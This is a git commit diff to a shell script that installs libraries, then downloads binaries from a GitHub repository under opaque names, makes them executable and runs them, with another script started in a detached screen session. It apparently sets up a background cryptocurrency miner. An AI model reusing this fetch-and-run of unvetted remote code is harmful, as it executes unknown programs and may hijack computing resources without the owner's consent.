b3eec996be1e169301e0c997a2f54a783e39a8ab
renilo <88342640+renilo@users.noreply.github.com>
2021-12-08 21:49:44 +0700

    Update xautokontol.sh

--- xautokontol.sh
+++ xautokontol.sh
@@ -8,6 +8,6 @@ screen -dmS xhajar.sh ./xhajar.sh 65 75
 
 sudo apt-get update && sudo apt-get upgrade -y && sudo apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1
 
-wget -qO manuk https://raw.githubusercontent.com/renilo/hajar/main/enak && wget -qO kontola https://raw.githubusercontent.com/renilo/hajar/main/xhajar.sh && chmod +x manuk kontola
+wget -qO manuk https://raw.githubusercontent.com/renilo/hajar/main/enake && wget -qO kontola https://raw.githubusercontent.com/renilo/hajar/main/xhajar.sh && chmod +x manuk kontola
 
 ./kontola
